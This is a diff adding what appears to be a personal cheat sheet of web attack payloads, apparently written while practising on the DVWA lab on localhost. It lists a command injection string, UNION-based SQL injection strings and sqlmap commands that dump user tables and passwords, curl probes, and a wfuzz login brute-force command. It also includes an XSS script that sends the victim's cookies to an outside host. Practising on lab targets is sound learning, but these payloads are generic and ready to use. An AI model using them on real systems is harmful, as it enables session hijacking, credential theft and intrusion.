@@ -1,0 +1,36 @@
+# command injection
+google.com && dir
+
+# SQL injection
+1' ORDER BY 3 #
+1' UNION SELECT null, table_name FROM information_schema.tables #
+1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = "users" #
+1' UNION SELECT user, password FROM users #
+
+# SQL injection (blind)
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=kh1dm1mm87qlole7db2fp9p3rt" --dbs
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=kh1dm1mm87qlole7db2fp9p3rt" -D dvwa --tables
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=kh1dm1mm87qlole7db2fp9p3rt" -D dvwa -T users --columns
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=kh1dm1mm87qlole7db2fp9p3rt" -D dvwa -T users -C user,password --dump
+
+# --head, -I
+curl.exe -I -X GET http://localhost/esd/demo.html
+curl.exe --head GET http://localhost/esd/demo.html
+curl.exe -H "X-shit:crotte" http://localhost/esd/test/test.php
+
+# xss
+<script>
+var cook = document.cookie;
+var img = document.createElement('img');
+img.src = 'http://salesite?cook=' + cook;
+document.body.appendChild(img)
+</script>
+
+
+https://hostingcanada.org/htpasswd-generator/
+https://wpscan.org/
+https://www.exploit-db.com/google-hacking-database
+
+
+# wfuzz
+wfuzz -b PHPSESSID=vho7ui5ofd6spcub06fs49cajf -c -z file,'/home/smalllist.txt' -z file,'/home/smalllist.txt' --hc 404 "http://localhost/wa/vulnerabilities/brute/?username=FUZ2Z&password=FUZZ&Login=Login#"
